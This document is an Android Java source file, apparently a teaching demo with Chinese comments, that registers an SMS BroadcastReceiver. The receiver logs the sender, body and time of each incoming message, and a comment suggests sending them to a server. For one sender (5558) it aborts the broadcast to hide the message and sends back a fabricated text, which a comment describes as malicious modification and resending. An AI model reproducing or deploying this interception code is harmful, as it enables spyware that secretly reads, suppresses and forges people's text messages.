package com.renwenk.getsms;

import java.text.SimpleDateFormat;
import java.util.Date;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

public class SmssReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {

		Log.d("TAG", "短信收到了。。。");
		//pdus的这个参数只在4.0前面的版本里面有效的
		Object[] pdus = (Object[]) intent.getExtras().get("pdus");
		for (Object obj : pdus) {
			SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) obj);
			// 获取短信的内容
			String body = smsMessage.getMessageBody();
			// 获取短信的发件人
			String sender = smsMessage.getOriginatingAddress();
			long date=smsMessage.getTimestampMillis();
	    	Date timeDate=new Date(date);
	    	SimpleDateFormat simpleDateFormat=new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
	    	String time=simpleDateFormat.format(timeDate);
			Log.d("TAG", "短信收到了。。。" + "sender:" + sender + ";body="
					+ body+ ";time="
					+ time);

			// 在这里就可以通过get或者post的请求提交到服务器

			if ("5558".equals(sender)) {
				// 拦截短信
				abortBroadcast();
				//拦截之后恶意修改短信再重发
				//需要在清单文件里面配置发送短信的权限
				SmsManager magage = SmsManager.getDefault();
				magage.sendTextMessage(sender, null, "我已经喜欢比尔了", null, null);
			}
		}
	}
}
